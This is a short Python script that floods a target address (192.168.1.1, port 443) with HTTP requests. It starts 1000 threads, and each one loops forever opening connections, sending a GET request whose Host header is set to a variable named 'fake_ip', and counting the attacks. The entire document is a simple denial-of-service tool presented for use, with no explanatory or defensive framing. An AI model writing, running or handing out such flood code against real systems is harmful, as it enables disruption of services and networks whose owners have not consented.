import socket
import threading

target = '192.168.1.1'  #iBus-MUJ
fake_ip = '182.21.20.33'
port = 443

attack_num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
